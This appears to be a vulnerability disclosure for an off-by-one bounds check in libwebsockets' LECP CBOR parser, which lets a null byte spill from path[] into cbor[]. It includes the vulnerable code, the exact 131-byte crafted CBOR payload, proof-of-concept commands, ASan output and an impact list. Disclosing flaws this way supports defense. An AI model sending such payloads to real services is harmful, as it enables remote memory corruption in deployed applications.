## Off-by-one in LECP path construction allows null byte write past ctx->path[] into adjacent ctx->cbor[] via crafted CBOR map key

lib/misc/lecp.c:789 uses > instead of >= in the bounds check before
memcpy, allowing a 1-byte overflow when pst->ppos + ctx->npos equals
sizeof(ctx->path). The memcpy at line 791 copies npos + 1 bytes
(including the null terminator), writing the terminating '\0' one byte
past the 128-byte path[] buffer into cbor[0].

Version: 4.5.99-v4.5.0-508-gb4b5aed39 (current main)
Commit:  b4b5aed39


Root cause (lib/misc/lecp.c:789-792):
```c
    /* bounds check uses > instead of >= */
    if (pst->ppos + ctx->npos > sizeof(ctx->path))   /* BUG: should be >= */
        goto reject_overflow;
    memcpy(&ctx->path[pst->ppos], ctx->buf,
           (size_t)(ctx->npos + 1));                  /* writes npos+1 bytes */

    /* When ppos + npos == 128 (sizeof(path)):
     *   check: 128 > 128 is FALSE -- does not reject
     *   memcpy writes npos+1 bytes starting at path[ppos]
     *   last byte (null terminator) lands at path[128] = cbor[0]
     */

    /* struct layout (include/libwebsockets/lws-lecp.h:260-261) */
    char    path[LECP_MAX_PATH];    /* 128 bytes, line 260 */
    uint8_t cbor[64];               /* immediately adjacent, line 261 */
```

### Trigger:
```bash
    python3 gen_poc_lecp_offby1.py       # generates poc_lecp_offby1.cbor
    ./poc_lecp_offby1_harness
```
The CBOR input is a single-entry map with a 127-byte text string key
("AAA...A") and value 0. When the parser processes this key, ppos=1
(from the '.' map prefix) and npos=127 (key length), so
ppos + npos = 128 = sizeof(ctx->path). The off-by-one check passes
(128 > 128 is false), and the null terminator lands at path[128] = cbor[0].

Total payload: 131 bytes (0xA1 + 0x78 0x7F + 'A'*127 + 0x00)


### ASan output:
```bash
    ==295619==ERROR: AddressSanitizer: use-after-poison on address 0xf2e4812002f0 at pc 0xf6e484607d80 bp 0xffffe2cace90 sp 0xffffe2cac670
    WRITE of size 128 at 0xf2e4812002f0 thread T0
        #0 in memcpy
        #1 in lecp_parse
        #2 in main poc_lecp_offby1_harness.c:187
        #3 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58

    Address is located in stack of thread T0 at offset 752 in frame
        #0 in main poc_lecp_offby1_harness.c:86
      This frame has 2 object(s):
        [32, 1120) 'ctx' <== Memory access at offset 752 is inside this variable

    SUMMARY: AddressSanitizer: use-after-poison in lecp_parse

    Note: the harness uses __asan_poison_memory_region() on cbor[0..7]
    to make the intra-struct overflow visible to ASan.
```

### Impact:

- Controlled write -- null byte overwrites cbor[0], corrupting
  the literal CBOR capture buffer (demonstrated with before/after)
- Remotely triggerable -- any network-facing application that parses
  CBOR from untrusted sources (IoT protocols, CoAP, COSE, etc.)
- No authentication required -- the overflow occurs during CBOR
  parsing, before any application-level authentication
- Affects any application using the lws LECP parser (lib/misc/lecp.c)

